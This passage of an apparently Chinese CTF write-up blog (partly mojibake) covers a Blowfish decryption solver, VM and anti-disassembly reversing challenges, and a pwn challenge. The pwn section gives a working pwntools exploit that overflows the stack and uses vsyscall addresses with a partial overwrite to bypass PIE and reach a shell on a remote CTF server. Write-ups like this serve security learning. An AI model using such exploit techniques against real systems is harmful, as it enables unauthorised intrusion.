class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Blowfish_Init</span><span class="params">(BLOWFISH_CTX* ctx, <span class="keyword">unsigned</span> <span class="keyword">char</span>* key, <span class="keyword">int</span> keyLen)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i, j, k;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> data, datal, datar;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++) &#123;</span><br><span class="line">        <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; <span class="number">256</span>; j++)</span><br><span class="line">            ctx-&gt;S[i][j] = ORIG_S[<span class="number">256</span>*i+j];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    j = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; N + <span class="number">2</span>; ++i) &#123;</span><br><span class="line">        data = <span class="number">0x00000000</span>;</span><br><span class="line">        <span class="keyword">for</span> (k = <span class="number">0</span>; k &lt; <span class="number">4</span>; ++k) &#123;</span><br><span class="line">            data = (data &lt;&lt; <span class="number">8</span>) | key[j];</span><br><span class="line">            j = j + <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">if</span> (j &gt;= keyLen)</span><br><span class="line">                j = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        ctx-&gt;P[i] = ORIG_P[i] ^ data;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    datal = <span class="number">0x00000000</span>;</span><br><span class="line">    datar = <span class="number">0x00000000</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; N + <span class="number">2</span>; i += <span class="number">2</span>) &#123;</span><br><span class="line">        Blowfish_Encrypt(ctx, &amp;datal, &amp;datar);</span><br><span class="line">        ctx-&gt;P[i] = datal;</span><br><span class="line">        ctx-&gt;P[i + <span class="number">1</span>] = datar;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">4</span>; ++i) &#123;</span><br><span class="line">        <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; <span class="number">256</span>; j += <span class="number">2</span>) &#123;</span><br><span class="line">            Blowfish_Encrypt(ctx, &amp;datal, &amp;datar);</span><br><span class="line">            ctx-&gt;S[i][j] = datal;</span><br><span class="line">            ctx-&gt;S[i][j + <span class="number">1</span>] = datar;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> ida_chars[] =</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="number">16</span>, <span class="number">181</span>,  <span class="number">42</span>, <span class="number">236</span>, <span class="number">176</span>,  <span class="number">80</span>, <span class="number">177</span>,  <span class="number">35</span>,  <span class="number">64</span>,  <span class="number">58</span>,</span><br><span class="line">        <span class="number">39</span>, <span class="number">124</span>,  <span class="number">30</span>,  <span class="number">83</span>,  <span class="number">41</span>,  <span class="number">31</span>, <span class="number">177</span>,  <span class="number">21</span>,  <span class="number">54</span>,  <span class="number">40</span>,</span><br><span class="line">        <span class="number">251</span>,  <span class="number">17</span>, <span class="number">191</span>, <span class="number">225</span>,  <span class="number">50</span>,  <span class="number">30</span>, <span class="number">197</span>,  <span class="number">18</span>, <span class="number">228</span>,  <span class="number">96</span>,</span><br><span class="line">        <span class="number">172</span>,  <span class="number">64</span></span><br><span class="line">    &#125;;<span class="comment">//é¢˜ç›®ä¸­çš„åŠ å¯†æ•°æ®</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> key[] = <span class="string">"R3v3rs3!"</span>;</span><br><span class="line">    <span class="keyword">char</span> flag[<span class="number">33</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"></span><br><span class="line">    Blowfish_Init(&amp;ctx, key, <span class="number">8</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">8</span>; i += <span class="number">2</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">int</span> *l = ((<span class="keyword">unsigned</span> <span class="keyword">int</span> *)(ida_chars + <span class="number">4</span> * i));</span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">int</span> *r = ((<span class="keyword">unsigned</span> <span class="keyword">int</span> *)(ida_chars + <span class="number">4</span> * (i+<span class="number">1</span>)));</span><br><span class="line">        </span><br><span class="line">        *l = _byteswap_ulong(*l), *r = _byteswap_ulong(*r);</span><br><span class="line">        Blowfish_Decrypt(&amp;ctx, l, r);</span><br><span class="line">        *l = _byteswap_ulong(*l), *r = _byteswap_ulong(*r);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"flag&#123;"</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%c"</span>, ida_chars[i]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"&#125;"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2020/07/29/%E6%9D%82%E5%90%88writeup/image-20200817165817614.png" alt="image-20200817165817614"></p><p>pythonä¸€å‘æè¿™äº›éƒ½æ˜¯å¾ˆæ–¹ä¾¿çš„ï¼Œæ‰¾åˆ°äº†å¯ä»¥ä½¿ç”¨Cryptoæ¨¡å—ã€‚</p><p><a href="https://www.cnblogs.com/ws17345067708/p/10552836.html" target="_blank" rel="noopener">å®‰è£…</a></p><p>gooleå’Œç™¾åº¦äº†ç”¨æ³• <a href="https://blog.csdn.net/yyhustim/article/details/8539065?utm_medium=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-2.channel_param&depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-2.channel_param" target="_blank" rel="noopener">ç”¨æ³•</a>ï¼šå¾—åˆ°å’ŒCè¯­è¨€ä¸­ä¸€æ ·çš„ç»“æœã€‚<img src="/2020/07/29/%E6%9D%82%E5%90%88writeup/image-20200817170245529.png" alt="image-20200817170245529"></p><p>æœ€åï¼Œå…³é”®å°±æ˜¯ç®—æ³•çš„å­¦ä¹ ã€‚</p><h2 id="magic-number-pwn"><a href="#magic-number-pwn" class="headerlink" title="magic_number (pwn)"></a>magic_number (pwn)</h2><blockquote><p>ç¬¬ä¸€æ¬¡é‡åˆ°ï¼Œåˆ©ç”¨vsyscallä¸­çš„retæŒ‡ä»¤å……å½“æ»‘æ¢¯ï¼Œç›´åˆ°å¯ä»¥é€šè¿‡è¦†ç›–ä½å­—èŠ‚å¤„å¾—åˆ°æˆ‘ä»¬æŒ‡å®šå‡½æ•°çš„åœ°å€ã€‚</p></blockquote><p>æŸ¥ä¿æŠ¤ï¼šå…³é”®å°±æ˜¯ç¨‹åºå¼€å¯äº†PIEã€‚</p><blockquote><p>PIEå…¨ç§°æ˜¯position-independent  executableï¼Œä¸­æ–‡è§£é‡Šä¸ºåœ°å€æ— å…³å¯æ‰§è¡Œæ–‡ä»¶ï¼Œè¯¥æŠ€æœ¯æ˜¯ä¸€ä¸ªé’ˆå¯¹ä»£ç æ®µï¼ˆ.textï¼‰ã€æ•°æ®æ®µï¼ˆ.dataï¼‰ã€æœªåˆå§‹åŒ–å…¨å±€å˜é‡æ®µï¼ˆ.bssï¼‰ç­‰å›ºå®šåœ°å€çš„ä¸€ä¸ªé˜²æŠ¤æŠ€æœ¯ï¼Œå¦‚æœç¨‹åºå¼€å¯äº†PIEä¿æŠ¤çš„è¯ï¼Œåœ¨æ¯æ¬¡åŠ è½½ç¨‹åºæ—¶éƒ½å˜æ¢åŠ è½½åœ°å€ã€‚</p></blockquote><p>æœ¬é¢˜ï¼Œæ ˆæº¢å‡ºï¼Œæ§åˆ¶ç¨‹åºèµ°å‘å³å¯ã€‚ä½†éš¾çš„å°±æ˜¯æœ‰PIEä½¿ç¨‹åºæ¯æ¬¡åŠ è½½çš„åœ°å€ä¸ä¸€æ ·ã€‚</p><p>åˆ©ç”¨vsyscallç»•è¿‡PIEã€‚<strong>å¯ä»¥åˆ©ç”¨çš„åœ°å€æ˜¯0xffffffffff600000ã€0xffffffffff600400ã€ 0xffffffffff600800</strong>ï¼Œå› ä¸ºä»–ä»¬æ˜¯ä¸å˜çš„ã€‚</p><p>é¦–å…ˆæŸ¥çœ‹åˆ©ç”¨procæ–‡ä»¶æŸ¥çœ‹ç¨‹åºåŠ è½½çš„åŸºåœ°å€ï¼š<img src="/2020/07/29/%E6%9D%82%E5%90%88writeup/image-20200911210254714.png" alt="image-20200911210254714"></p><p>æ›´æ”¹idaè½½å…¥çš„åŸºåœ°å€ä½¿å…¶ä¸ä¹‹å¯¹åº”ã€‚æ‰¾åˆ°è¦ä¸‹æ–­çš„åœ°å€ã€‚<img src="/2020/07/29/%E6%9D%82%E5%90%88writeup/image-20200911210500410.png" alt="image-20200911210500410"></p><p>gdbä¸‹æ–­è°ƒè¯•ï¼Œé€šè¿‡æŸ¥çœ‹æ ˆç¡®å®šéœ€è¦ä½¿ç”¨vsyscallçš„ä¸ªæ•°ã€‚å¯ä»¥çœ‹åˆ°ä½¿ç”¨4ä¸ªå³å¯ã€‚<img src="/2020/07/29/%E6%9D%82%E5%90%88writeup/image-20200911210854601.png" alt="image-20200911210854601"></p><p>æ‰¾åˆ°éœ€è¦æ§åˆ¶ç¨‹åºèµ°å‘çš„ç›®çš„åœ°å€ã€‚ï¼ˆå³system(â€˜bin/shâ€™);ï¼‰<img src="/2020/07/29/%E6%9D%82%E5%90%88writeup/image-20200911211045084.png" alt="image-20200911211045084"></p><p>æ‰€ä»¥æœ€ååªéœ€å°†æœ€ä½å­—èŠ‚çš„<strong>80</strong>è¦†ç›–ä¸º<strong>A8</strong>å³å¯ã€‚</p><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">p = remote(<span class="string">'183.129.189.60'</span>, <span class="number">10053</span>)</span><br><span class="line"><span class="comment">#p = process('./8')</span></span><br><span class="line">pay = <span class="string">'B'</span>*<span class="number">0x38</span>+p64(<span class="number">0xFFFFFFFFFF600400</span>)+p64(<span class="number">0xFFFFFFFFFF600400</span>)+p64(<span class="number">0xFFFFFFFFFF600400</span>)+p64(<span class="number">0xFFFFFFFFFF600400</span>)+<span class="string">b'\xA8'</span></span><br><span class="line">p.recvuntil(<span class="string">'Your Input :'</span>)</span><br><span class="line">p.send(pay)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="VM-WORLDï¼ˆreï¼‰"><a href="#VM-WORLDï¼ˆreï¼‰" class="headerlink" title="VM_WORLDï¼ˆreï¼‰"></a>VM_WORLDï¼ˆreï¼‰</h2><blockquote><p>é“¾æ¥ï¼š<a href="https://pan.baidu.com/s/1BYmMrqGaiKT6W_HVd9eoPA" target="_blank" rel="noopener">https://pan.baidu.com/s/1BYmMrqGaiKT6W_HVd9eoPA</a><br>æå–ç ï¼š5b5o<br>å¤åˆ¶è¿™æ®µå†…å®¹åæ‰“å¼€ç™¾åº¦ç½‘ç›˜æ‰‹æœºAppï¼Œæ“ä½œæ›´æ–¹ä¾¿å“¦</p></blockquote><p>ä¸€ä¸ªç®€å•çš„è™šæ‹Ÿæœºé¢˜ç›®ï¼Œä»å­¦æ ¡å¸ˆå‚…å“ªé‡Œå­¦ä¼šäº†ä¿®å¤idaæ— æ³•F5switchè¯­å¥çš„æ–¹æ³•ã€‚</p><p>é¦–å…ˆç®€å•çœ‹ä¸€ä¸‹:<img src="/2020/07/29/%E6%9D%82%E5%90%88writeup/image-20200912171012942.png" alt="image-20200912171012942"></p><p>æ‰€ä»¥è¿›å…¥ODåŠ¨æ€åˆ°å…³é”®å‡½æ•°ï¼Œå¹¶dumpå‡ºï¼Œè½½å…¥idaï¼šå¯ä»¥çœ‹åˆ°æ˜¯ä¸èƒ½F5çš„ã€‚<img src="/2020/07/29/%E6%9D%82%E5%90%88writeup/image-20200912171258533.png" alt="image-20200912171258533"></p><p>ä½†çœ‹äº†ä¸€ä¸‹è¿™ä¸ªå‡½æ•°çš„ä»£ç ä¹Ÿä¸æ˜¯å¾ˆé•¿ï¼Œç›´æ¥è¯»æ±‡ç¼–å°†å…¶å†™æˆäº†Cè¯­è¨€ä»£ç ï¼šä¸€ä¸ªç®€å•çš„è™šæ‹Ÿæœºã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt; </span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> op[] = &#123;<span class="number">0xF0</span>, <span class="number">0xF2</span>, <span class="number">0xF3</span>, <span class="number">0x01</span>, <span class="number">0xF5</span>,</span><br><span class="line">  <span class="number">0xF0</span>, <span class="number">0xF6</span>, <span class="number">0xF4</span>, <span class="number">0xF1</span>, <span class="number">0xF7</span>&#125;;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> n = <span class="number">0</span>, temp = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span> i = <span class="number">0</span>, j = <span class="number">0</span>, k = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">char</span> input[] = <span class="string">"aaaaaaaaaaaaaaaaa"</span>;</span><br><span class="line"><span class="keyword">char</span> s[<span class="number">50</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line">n = op[i]<span class="number">-0xf0</span>;</span><br><span class="line"><span class="keyword">if</span>(n == <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">s[k] = input[j] &amp; <span class="number">0xFF</span>;</span><br><span class="line">k++, i++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(n == <span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line">k--;</span><br><span class="line">input[j<span class="number">-1</span>] = s[k];</span><br><span class="line">i++; </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(n == <span class="number">2</span>)</span><br><span class="line">&#123;</span><br><span class="line">k--;</span><br><span class="line">temp = s[k];</span><br><span class="line">i++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(n == <span class="number">3</span>)</span><br><span class="line">&#123;</span><br><span class="line">temp += op[i+<span class="number">1</span>];</span><br><span class="line">i += <span class="number">2</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(n == <span class="number">4</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">int</span> t = <span class="number">0</span>, ans = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span>(k == <span class="number">0</span>)</span><br><span class="line">t = i;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">t = s[k<span class="number">-1</span>];</span><br><span class="line">ans = t ^ temp;</span><br><span class="line"><span class="keyword">if</span>(k == <span class="number">0</span>)</span><br><span class="line">i = ans;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">s[k<span class="number">-1</span>] = ans;</span><br><span class="line">i++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(n == <span class="number">5</span>)</span><br><span class="line">&#123;</span><br><span class="line">j++;</span><br><span class="line">i++; </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(n == <span class="number">6</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">int</span> t = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span>(k == <span class="number">0</span>)</span><br><span class="line">t = i;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">t = s[k<span class="number">-1</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(t == <span class="number">0</span> || t == <span class="number">10</span>)</span><br><span class="line">i += <span class="number">3</span>;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">i += <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(n == <span class="number">7</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">int</span> _64 = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span>(input[_64])</span><br><span class="line">&#123;</span><br><span class="line">_64++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(j == _64)</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">i = <span class="number">0</span>;</span><br><span class="line">&#125; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="built_in">strlen</span>(input); i++)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%d "</span>, input[i]); </span><br><span class="line"> </span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å…¶å®å°±åªæœ‰å¼‚æˆ–å’ŒåŠ å‡æ“ä½œï¼Œç®€ç­”é€†ä¸€ä¸‹å³å¯ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> ida_[] =</span><br><span class="line">&#123;</span><br><span class="line">   <span class="number">11</span>,  <span class="number">12</span>,   <span class="number">5</span>,  <span class="number">19</span>,  <span class="number">73</span>,  <span class="number">87</span>,   <span class="number">3</span>,  <span class="number">91</span>,  <span class="number">13</span>,  <span class="number">12</span>, </span><br><span class="line">    <span class="number">4</span>,  <span class="number">10</span>,  <span class="number">20</span>,  <span class="number">75</span>,  <span class="number">84</span>,  <span class="number">82</span>,  <span class="number">83</span>,  <span class="number">31</span>,  <span class="number">26</span>,  <span class="number">84</span>, </span><br><span class="line">   <span class="number">86</span>,  <span class="number">86</span>,  <span class="number">73</span>,  <span class="number">76</span>,   <span class="number">2</span>,  <span class="number">91</span>,  <span class="number">94</span>,  <span class="number">72</span>,  <span class="number">74</span>,  <span class="number">83</span>, </span><br><span class="line">   <span class="number">82</span>,   <span class="number">4</span>,  <span class="number">83</span>,  <span class="number">84</span>,   <span class="number">2</span>,  <span class="number">92</span>,  <span class="number">11</span>,   <span class="number">3</span>,   <span class="number">6</span>,   <span class="number">2</span>, </span><br><span class="line">   <span class="number">69</span>, <span class="number">125</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">40</span>; i &gt;= <span class="number">0</span>; i--)</span><br><span class="line">ida_[i] = (ida_[i]^ida_[i+<span class="number">1</span>])<span class="number">-1</span>;</span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">42</span>; i++)</span><br><span class="line"><span class="built_in">putchar</span>(ida_[i]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="comment">//flag&#123;5aa97418-e2a1-4a4c-ba9d-d6eb0ed91147&#125;</span></span><br></pre></td></tr></table></figure><p>åé¢é—®äº†å‡ºé¢˜å¸ˆå‚…ï¼Œæ‰çŸ¥é“é‚£ä¸ªæ˜¯å¯ä»¥ä¿®å¤ä¸€ä¸‹çš„ã€‚å…¶å®å°±æ˜¯switchè¯­å¥çš„æ¯ä¸ªè·³è½¬ç”¨äº†ä¸€å¼ è¡¨æ¥å­˜å‚¨ï¼Œä½†ç”±äºåŸºåœ°å€ç­‰å¯¹ä¸ä¸Šï¼Œå¯¼è‡´åˆ†æå‡ºé”™ã€‚</p><p>æ‰€ä»¥é¦–å…ˆä¿®æ”¹ä¸è¡¨å¯¹åº”çš„åŸºåœ°å€ï¼Œç„¶åæ¢å¤å‚¨å­˜è·³è½¬çš„è¡¨ã€‚<img src="/2020/07/29/%E6%9D%82%E5%90%88writeup/image-20200912172413213.png" alt="image-20200912172413213"></p><p>æœ€åæ‰‹åŠ¨ä¿®æ”¹swicthçš„å£°æ˜ï¼š<img src="/2020/07/29/%E6%9D%82%E5%90%88writeup/image-20200912172623345.png" alt="image-20200912172623345"></p><h2 id="olfo-10-17-n1ctf"><a href="#olfo-10-17-n1ctf" class="headerlink" title="olfo(10.17 n1ctf)"></a>olfo(10.17 n1ctf)</h2><p>é¦–å…ˆæ‰“å¼€idaçœ‹ä¸åˆ°å‘ç°æ²¡æœ‰æ‰¾åˆ°mainå‡½æ•°ï¼Œè¿™æ˜¯åŠ äº†èŠ±æŒ‡ä»¤ï¼Œidaæ‰¾ä¸åˆ°ã€‚ã€‚ä»startå¯ä»¥çœ‹åˆ°ã€‚</p><p>èŠ±æŒ‡ä»¤å¾ˆå°‘ï¼ˆ2ç§ï¼‰ä¹Ÿå¾ˆç®€å•ï¼Œæ‰‹åŠ¨å»é™¤éƒ½å¯ã€‚ã€‚</p><p>jmp</p><p><img src="/2020/07/29/%E6%9D%82%E5%90%88writeup/image-20201017173801189.png" alt="image-20201017173801189"></p><p>call</p><p><img src="/2020/07/29/%E6%9D%82%E5%90%88writeup/image-20201017173819199.png" alt="image-20201017173819199"></p><p>ç„¶åå°±æ˜¯ç”¨fork()å‡½æ•°åˆ›å»ºä¸€ä¸ªå­è¿›ç¨‹ï¼Œè¿”å›2æ¬¡ï¼Œå½“æ˜¯çˆ¶è¿›ç¨‹æ—¶è¿”å›ä¸€ä¸ªå¤§äº0çš„æ•°ï¼Œä¸”åœ¨çˆ¶è¿›ç¨‹ä½¿ç”¨ptraceå‡½æ•°è·å¾—ä¸€äº›åé¢å¼‚æˆ–éœ€è¦çš„æ•°æ®ã€‚<img src="/2020/07/29/%E6%9D%82%E5%90%88writeup/image-20201017174401711.png" alt="image-20201017174401711"></p><p>å¯¹äºæˆ‘ï¼Œå…³é”®å°±æ˜¯forkï¼ˆï¼‰å¤šè¿›ç¨‹çš„è°ƒè¯•ï¼Œè¿™é‡Œidaæˆ‘åŠ¨è°ƒä¸€ç›´åœ¨waitçŠ¶æ€ã€‚ã€‚</p><p>ç„¶åæ‰¾åˆ°gdbå¤šè¿›ç¨‹è°ƒè¯•ã€‚ä½¿ç”¨<strong>set follow-fork-mode [parent|child]</strong>æŒ‡å®šè°ƒè¯•çš„è¿›ç¨‹ï¼Œç”¨<strong>show follow-fork-mode</strong>æŸ¥çœ‹è¢«è°ƒè¯•çš„è¿›ç¨‹ã€‚<a href="https://blog.csdn.net/fingding/article/details/46459095" target="_blank" rel="noopener">fork å¤šè¿›ç¨‹è°ƒè¯•</a></p><p>å…¶å®ƒçš„å°±ä¸è¯´äº†ï¼Œæœ€åç›´æ¥idapythonå¾—åˆ°flagã€‚</p><p>è¿˜æœ‰å°±æ˜¯ä¸€ç¯‡å…³äºptraceç†è§£çš„æ–‡ç« ï¼ˆå¾ˆè¯¦ç»†ï¼‰ï¼š<a href="https://www.cnblogs.com/mysky007/p/11047943.html" target="_blank" rel="noopener">ptrace</a></p><h2 id="ctfshow-å¤§ç‰›æ¯ï¼ˆ2021-5-4ï¼‰"><a href="#ctfshow-å¤§ç‰›æ¯ï¼ˆ2021-5-4ï¼‰" class="headerlink" title="ctfshow_å¤§ç‰›æ¯ï¼ˆ2021/5/4ï¼‰"></a>ctfshow_å¤§ç‰›æ¯ï¼ˆ2021/5/4ï¼‰</h2><h3 id="easy"><a href="#easy" class="headerlink" title="easy"></a>easy</h3><p>ä¸€ä¸ªbaseç§»ä½çš„æ“ä½œï¼Œç„¶åè€ƒäº†ä¸€ä¸ªé€»è¾‘è¡¨è¾¾å¼åŒ–ç®€ï¼Œè®°å½•ä¸€ä¸‹ã€‚</p><p>é¦–å…ˆçœ‹åˆ°ç§»ä½ï¼š</p><p><img src="/2020/07/29/%E6%9D%82%E5%90%88writeup/image-20210504205241610.png" alt="image-20210504205241610"></p><p>æ¯5ä¸ªå˜4ä¸ªï¼Œå®è´¨å°±æ˜¯æŠŠ5*8 = 40ä½ï¼Œåˆ†æˆäº†40/10 = 4ï¼Œ1ä¸ªå­—èŠ‚å­˜æ”¾ä¸ä¸‹ï¼Œæ‰€ä»¥ç»“æœä½¿ç”¨dwordå‹æ•°æ®å­˜æ”¾çš„ã€‚è¿™å’Œé‚£äº›base64ï¼Œbase32éƒ½æ˜¯ä¸€ä¸ªé“ç†ï¼Œå°±çœ‹æ€ä¹ˆåˆ†é…é‚£äº›ä½ã€‚base64ï¼šé™¤ä»¥6ï¼›base32ï¼šé™¤ä»¥5ï¼›å…¶å®ƒéƒ½æ˜¯ä¾æ¬¡ç±»æ¨ã€‚</p><p><img src="/2020/07/29/%E6%9D%82%E5%90%88writeup/image-20210504212207209.png" alt="image-20210504212207209"></p><p>ç„¶åé€»è¾‘è¡¨è¾¾å¼è¿ç®—ï¼š4ä¸€ä¸ªéƒ½æ˜¯ä¸€æ ·çš„è®¡ç®—ï¼Œæ¯æ¬¡å¤„ç†4ä¸ªå­—èŠ‚ï¼Œä¸€å…±16ä¸ªå­—èŠ‚ã€‚æŠŠè¿™ä¸ªè¿ç®—å†™å‡ºæ¥ï¼š(a^b)&amp;(~(a&amp;b)) = a^bï¼›</p><p><img src="/2020/07/29/%E6%9D%82%E5%90%88writeup/image-20210504210119852.png" 